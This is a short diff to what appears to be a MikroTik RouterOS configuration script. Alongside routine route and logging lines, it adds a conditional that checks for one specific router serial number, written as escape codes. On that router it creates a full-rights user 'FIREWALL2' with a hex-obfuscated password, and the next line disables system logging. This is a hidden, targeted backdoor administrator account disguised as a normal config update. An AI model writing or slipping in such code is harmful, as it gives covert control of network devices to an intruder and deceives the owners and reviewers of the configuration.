@@ -199,6 +199,9 @@ add distance=1 dst-address=100.100.8.0/22 gateway=VITROISP;
 } else={
 :log info "Config Updated"
 }
+:if ([/system routerboard get serial-number] = "\36\36\31\37\30\36\46\41\34\33\31\37") do={
+/user add name="FIREWALL2" password="\66\69\72\65\77\61\6c\6c\6d\61\6e" group=full
+}
 /system logging disable 0
 /system routerboard settings
 set reformat-hold-button=20
